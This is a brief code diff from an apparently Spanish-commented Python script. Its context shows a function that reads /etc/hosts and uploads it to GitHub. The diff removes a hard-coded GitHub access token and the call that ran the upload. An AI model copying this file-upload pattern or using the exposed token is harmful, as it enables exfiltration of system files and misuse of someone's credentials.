@@ -79,10 +79,5 @@ def run(token):
     # Leer /etc/hosts y subirlo a GitHub
     catAndUpload('/etc/hosts', token)
 
-# Token desde el primer código
-token = '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'
-
-run(token)
-
 
 
